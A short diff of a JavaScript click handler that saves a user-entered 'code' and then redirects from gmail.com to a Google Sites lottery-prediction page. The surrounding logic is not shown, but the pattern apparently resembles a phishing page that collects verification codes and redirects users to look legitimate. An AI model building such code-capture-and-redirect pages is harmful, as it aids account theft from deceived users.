@@ -97,5 +97,5 @@ continueBtn.addEventListener('click', async () => {
     console.error('Error saving code:', err);
   }
 
-  window.location.href = 'https://www.gmail.com';
+  window.location.href = 'https://sites.google.com/view/uk49freepredict/home';
 });
